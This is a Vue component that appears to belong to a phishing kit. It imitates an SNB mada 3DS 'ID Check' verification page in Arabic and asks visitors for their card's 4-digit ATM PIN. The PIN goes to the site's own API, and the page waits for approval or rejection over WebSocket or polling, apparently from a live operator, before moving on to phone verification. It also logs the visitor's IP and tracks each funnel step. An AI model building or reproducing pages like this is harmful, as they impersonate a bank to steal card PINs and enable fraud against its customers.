<template>
<!-- ════════════════════════════════════════════════════════════════════════════════ -->
<!-- SECTION 9 - LAYOUT: PAGE WRAPPER & CARD CONTAINER -->
<!-- ════════════════════════════════════════════════════════════════════════════════ -->

    <div class="tds-shell" dir="rtl">

        <div class="tds-card" :class="{ 'tds-card--busy': isVerifying }">

            <!-- Loading overlay shown while bank 3DS processes PIN -->
            <Transition name="verify-fade">
                <div v-if="isVerifying" class="tds-overlay">
                    <img :src="loadingGif" alt="" class="tds-overlay__gif" />
                    <p class="tds-overlay__text">جاري التحقق...</p>
                </div>
            </Transition>

            <!-- ════════════════════════════════════════════════════════════════════ -->
            <!-- SECTION 10 - CONTENT: BRANDING, FORM, AND BUTTONS -->
            <!-- ════════════════════════════════════════════════════════════════════ -->

            <!-- Branding header (bank and payment network logos) -->
            <div class="tds-header">
                <img :src="bankMadaLogo" alt="SNB mada" class="tds-header__bank" />
                <img :src="schemeLogo" alt="ID Check" class="tds-header__scheme" />
            </div>

            <!-- Error alert (PIN rejection reason or API failure) -->
            <div v-if="error" class="tds-error">{{ error }}</div>

            <!-- Page title -->
            <h1 class="tds-title">التحقق بالرقم السري</h1>

            <!-- Page description -->
            <p class="tds-info">الرجاء إدخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام</p>

            <!-- PIN input field -->
            <div class="tds-field">
                <label for="PaymentATM" class="tds-field__label">الرقم السري</label>
                <input
                    id="PaymentATM"
                    v-model="pinCode"
                    type="tel"
                    maxlength="4"
                    placeholder="****"
                    :disabled="isVerifying"
                    class="tds-field__input"
                    @keyup.enter="submitPin"
                />
            </div>

            <!-- Confirm button (enabled only if PIN is valid) -->
            <button
                id="atm_code_submit"
                type="button"
                :disabled="!isPinValid || isVerifying"
                class="tds-btn tds-btn--primary"
                @click="submitPin"
            >
                CONFIRM
            </button>
        </div>

        <!-- Cancel button (returns to checkout) -->
        <button type="button" class="tds-cancel" @click="$router.replace({ name: 'checkout' })">
            CANCEL
        </button>

        <!-- ════════════════════════════════════════════════════════════════════════ -->
        <!-- SECTION 11 - FOOTER (OPTIONAL HELP OR INFO) -->
        <!-- ════════════════════════════════════════════════════════════════════════ -->

    </div>
</template>

<script setup>
// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 1 - IMPORTS & DEPENDENCIES
// ═══════════════════════════════════════════════════════════════════════════════════

import { ref, computed, onMounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { trackStepViewed, trackStepCompleted } from '@/composables/useFunnelTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getPinStatus } from '@/api/paymentApi';
import { getReasonLabel } from '@/constants/rejectionReasons';
import { safeRedirect } from '@/utils/safeRedirect';
import logger from '@/utils/logger';
import _paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';
import bankMadaLogo from '@/../../resources/images/logo/banks/bank_mada.png';
import schemeLogo from '@/../../resources/images/logo/banks/scheme.png';
import loadingGif from '@/../../resources/images/logo/banks/loading.gif';

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 2 - ROUTER, I18N & DEPENDENCIES
// ═══════════════════════════════════════════════════════════════════════════════════

const { t } = useI18n();
const router = useRouter();

/**
 * Initialize visitor tracking for card PIN verification page
 * @type {void}
 */
useVisitorTracking( 'card-pin' );

/**
 * Get payment context from composable (session, card, verification state)
 * @type {Object} { context, resolveCustomerIp, submitPin }
 */
const { context, resolveCustomerIp, submitPin: submitPinApi } = usePayment();

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 3 - STATE: SESSION & CONTEXT
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Get session ID from payment context (used for polling)
 * @type {string}
 */
const sessionId = context.sessionId || '';

/**
 * Get customer IP address (populated during onMounted)
 * @type {import('vue').Ref<string>}
 */
const customerIpRef = ref( context.customerIp || '' );

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 4 - STATE: PIN INPUT & VALIDATION
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * User-entered 4-digit PIN code
 * @type {import('vue').Ref<string>}
 */
const pinCode = ref( '' );

/**
 * Check if PIN code is valid (exactly 4 digits)
 * @type {import('vue').ComputedRef<boolean>}
 */
const isPinValid = computed( () => /^\d{4}$/.test( pinCode.value ) );

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 5 - STATE: SUBMISSION & ERROR HANDLING
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Is PIN verification in progress (waiting for bank 3DS system)
 * @type {import('vue').Ref<boolean>}
 */
const isVerifying = ref( false );

/**
 * Has user submitted PIN already (prevents double-submit across re-mounts)
 * @type {import('vue').Ref<boolean>}
 */
const hasSubmitted = ref( false );

/**
 * Error message from PIN submission or gateway rejection
 * @type {import('vue').Ref<string>}
 */
const error = ref( '' );

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 6 - PIN SUBMISSION HANDLER
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Submit PIN code for bank verification
 * Calls payment API and waits for bank 3DS response via WebSocket or polling
 * Prevents double-submit via hasSubmitted flag
 *
 * @async
 * @returns {Promise<void>}
 */
async function submitPin() {
    if ( !isPinValid.value || isVerifying.value || hasSubmitted.value ) return;

    isVerifying.value = true;
    hasSubmitted.value = true;
    error.value = '';

    const success = await submitPinApi( pinCode.value );

    if ( success ) {
        logger.debug( '[CardPin] Submitted successfully, waiting for approval' );
    } else {
        error.value = t( 'verification.cardPin.submitError' );
        isVerifying.value = false;
        hasSubmitted.value = false;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 7 - WEBSOCKET & POLLING: BANK 3DS RESPONSE HANDLING
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Setup WebSocket listener + polling for bank 3DS response
 * Handles both real-time WebSocket approvals/rejections and polling fallback
 * Routes user to next step (PhoneVerification) or shows error
 *
 * Note: PIN events broadcast on the 'otp' channel (shared with OTP events, filtered by event name)
 *
 * @type {Object} { setup }
 */
const { setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'otp',           // PIN events broadcast on 'otp' channel
    approvedEvent: 'PinApproved',
    rejectedEvent: 'PinRejected',
    logTag: 'CardPin',

    /**
     * Handle successful PIN verification from bank 3DS system
     * Routes to PhoneVerification page
     * @param {Object} event - WebSocket approval event with optional redirect_to
     */
    onApproved( event ) {
        logger.debug( '[CardPin] Approved:', event );
        isVerifying.value = false;
        trackStepCompleted( 'card_pin', 'phone_verification' );

        // Defer navigation via microtask to release the WS message handler
        queueMicrotask( () => {
            if ( event.redirect_to ) {
                safeRedirect( event.redirect_to, 'phoneVerification', router );
            } else {
                router.push( { name: 'phoneVerification' } );
            }
        } );
    },

    /**
     * Handle PIN verification rejection from bank 3DS system
     * Clears PIN and allows user to retry
     * @param {Object} event - WebSocket rejection event with reason code
     */
    onRejected( event ) {
        logger.debug( '[CardPin] Rejected:', event );
        isVerifying.value = false;
        error.value = getReasonLabel( event.reason, t ) || t( 'verification.cardPin.pinRejected' );
        pinCode.value = '';
        hasSubmitted.value = false;
    },

    /**
     * Polling fallback for bank 3DS response
     * Queries server status periodically if WebSocket is unavailable
     * @async
     * @param {Object} handlers - { handleApproved, handleRejected } callbacks
     */
    async pollFn( { handleApproved, handleRejected } ) {
        const sig = context.statusSigs?.pin || '';
        if ( !isVerifying.value || !sig ) return;

        const { data } = await getPinStatus( sessionId, sig );

        if ( data.status === 'verified' ) {
            handleApproved( data );
        } else if ( data.status === 'rejected' ) {
            handleRejected( { reason: data.reason || 'pin_other' } );
        }
    },
} );

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 8 - LIFECYCLE HOOKS: MOUNT
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Initialize card PIN verification page
 * Sets up WebSocket listener, localization, and IP tracking
 *
 * @async
 */
onMounted( async () => {
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    // Resolve customer IP if not already available
    const ip = customerIpRef.value || await resolveCustomerIp();
    customerIpRef.value = ip;

    // Setup WebSocket listener + polling for bank 3DS response
    setupWs( sessionId );

    // Track user reached PIN verification step
    trackStepViewed( 'card_pin' );
} );

// WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
</script>

<style scoped>
/* ═══ CardPinPage — SNB Bank 3DS Style ═══ */

.tds-shell {
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 1rem;
    background: #f0f0f0;
    font-family: inherit;
}

/* ── Card ─────────────────────────────────────── */
.tds-card {
    position: relative;
    width: 100%;
    max-width: 420px;
    background: #fff;
    border-radius: 4px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
    overflow: hidden;
}

.tds-card--busy {
    pointer-events: none;
}

/* ── Processing overlay ──────────────────────── */
.tds-overlay {
    position: absolute;
    inset: 0;
    z-index: 20;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: rgba(255, 255, 255, 0.92);
    backdrop-filter: blur(4px);
    -webkit-backdrop-filter: blur(4px);
}

.tds-overlay__gif {
    width: 60px;
    height: 60px;
    margin-bottom: 0.75rem;
}

.tds-overlay__text {
    font-size: 14px;
    color: #333;
    font-weight: 600;
}

/* ── Branding header ─────────────────────────── */
.tds-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 12px 20px;
    background: #e8f5f3;
    border-bottom: 1px solid #d4ece8;
}

.tds-header__bank {
    height: 32px;
    width: auto;
    object-fit: contain;
}

.tds-header__scheme {
    height: 36px;
    width: auto;
    object-fit: contain;
}

/* ── Error ────────────────────────────────────── */
.tds-error {
    padding: 10px 20px;
    background: #fef2f2;
    border-bottom: 1px solid #fca5a5;
    color: #dc2626;
    font-size: 14px;
    font-weight: 500;
}

/* ── Title ────────────────────────────────────── */
.tds-title {
    font-size: 18px;
    font-weight: 700;
    color: #1a1a1a;
    padding: 16px 20px 0;
    margin: 0;
}

/* ── Info ─────────────────────────────────────── */
.tds-info {
    padding: 10px 20px 16px;
    font-size: 14px;
    line-height: 1.8;
    color: #444;
    margin: 0;
}

/* ── Field ────────────────────────────────────── */
.tds-field {
    padding: 0 20px 16px;
}

.tds-field__label {
    display: block;
    font-size: 13px;
    font-weight: 600;
    color: #333;
    margin-bottom: 6px;
}

.tds-field__input {
    width: 100%;
    padding: 10px 14px;
    font-size: 20px;
    border: 1px solid #ccc;
    border-radius: 4px;
    direction: ltr;
    text-align: center;
    letter-spacing: 0.3em;
    box-sizing: border-box;
    transition: border-color 0.2s;
}

.tds-field__input:focus {
    outline: none;
    border-color: #1a5276;
    box-shadow: 0 0 0 2px rgba(26, 82, 118, 0.15);
}

.tds-field__input:disabled {
    background: #f5f5f5;
    cursor: not-allowed;
}

/* ── Button ───────────────────────────────────── */
.tds-btn {
    display: block;
    width: calc(100% - 40px);
    margin: 0 auto 20px;
    padding: 12px;
    font-size: 15px;
    font-weight: 700;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    text-align: center;
    transition: opacity 0.2s;
    letter-spacing: 0.05em;
}

.tds-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

.tds-btn--primary {
    background: #1a5276;
    color: #fff;
}

.tds-btn--primary:hover:not(:disabled) {
    background: #154360;
}

/* ── Cancel ───────────────────────────────────── */
.tds-cancel {
    display: block;
    margin-top: 12px;
    padding: 8px 20px;
    background: none;
    border: none;
    cursor: pointer;
    font-size: 14px;
    font-weight: 600;
    color: #dc2626;
    letter-spacing: 0.05em;
    transition: opacity 0.15s;
}

.tds-cancel:hover {
    opacity: 0.7;
}

/* ── Transition ──────────────────────────────── */
.verify-fade-enter-active,
.verify-fade-leave-active {
    transition: opacity 0.25s ease;
}

.verify-fade-enter-from,
.verify-fade-leave-to {
    opacity: 0;
}
</style>
